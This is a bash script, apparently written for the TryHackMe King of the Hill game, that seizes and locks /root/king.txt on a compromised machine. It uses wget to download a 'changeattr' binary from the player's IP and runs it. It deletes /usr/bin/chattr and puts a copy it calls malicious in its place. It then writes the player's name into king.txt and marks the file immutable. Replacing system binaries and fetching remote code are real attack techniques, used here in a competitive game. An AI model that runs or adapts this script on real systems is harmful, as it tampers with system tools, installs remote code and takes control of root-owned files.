#!/bin/bash

# Set important variables
king="/root/king.txt"     # path to king.txt
chattr="/usr/bin/chattr"  # path to chattr
ip="10.8.105.196"         # player THM IP
user="z0d1ac"             # player username

# Define colors
white='\033[1;37m'
green='\033[0;32m'
red='\033[0;31m'
blue='\033[38;5;123m'
yellow='\033[0;33m'
reset='\033[0m'

prompt="${white} [${red}+${white}]${green}"

printf "${red}\n"
printf "    _  ___                 _             \n"
printf "   | |/ (_)_ __   __ _ ___| |_ ___ _ __  \n"
printf "   | ' /| | '_ \ / _' / __| __/ _ \ '__| \n"
printf "   | . \| | | | | (_| \__ \ ||  __/ |    \n"
printf "   |_|\_\_|_| |_|\__, |___/\__\___|_|    \n"
printf "                  |___/                  \n"
printf "${reset}\n"


# Check if changeattr exists in the cwd
if [ ! -x "./changeattr" ]; then
    printf "${prompt} changeattr not found in the current directory.\n\n"
    wget -q "${ip}/changeattr"
    chmod +x changeattr
    ./changeattr +iatesu changeattr &>/dev/null
    set -o noclobber changeattr
    printf "${prompt} changeattr downloaded and protected.\n\n"
fi

# Remove the existing chattr and create a fake one
printf "${prompt} Creating mallicious chattr${yellow}\n\n"
./changeattr -iatesu ${chattr} &>/dev/null
rm -rf ${chattr}
cp chattr ${chattr}
chmod a+x ${chattr}
./changeattr +iatesu ${chattr} &>/dev/null

# Dominate king.txt
printf "${prompt} Resetting attributes of${white} ${king} ${green}and removing it.${blue}\n\n"
set +o noclobber ${king}
umount ${king}
printf "\n"
./changeattr -iatesu ${king}
rm -rf ${king}
printf "\n"
printf "${prompt} Setting${white} ${user} ${green}as King${blue}\n\n"
echo ${user} > ${king}
printf "${prompt} Setting attributes of${white} ${king} ${green}(protecting king.txt)${blue}\n\n"
./changeattr +iatesu ${king}
set -o noclobber ${king}

# Check if there were any errors in the previous command
printf "\n"
if [ "$?" -eq 0 ]; then
    if [ $(cat ${king}) == ${user} ]; then
        printf "${prompt} Congratulations${white} ${user} ${green}, You are the new King of the game!${reset}\n"
    else
        printf "${red}An error occurred while setting ${user} in ${king}${reset}\n"
        exit 1
    fi
else
    printf "${red}An error occurred while protecting ${king}${reset}\n"
    exit 2
fi


exit 0
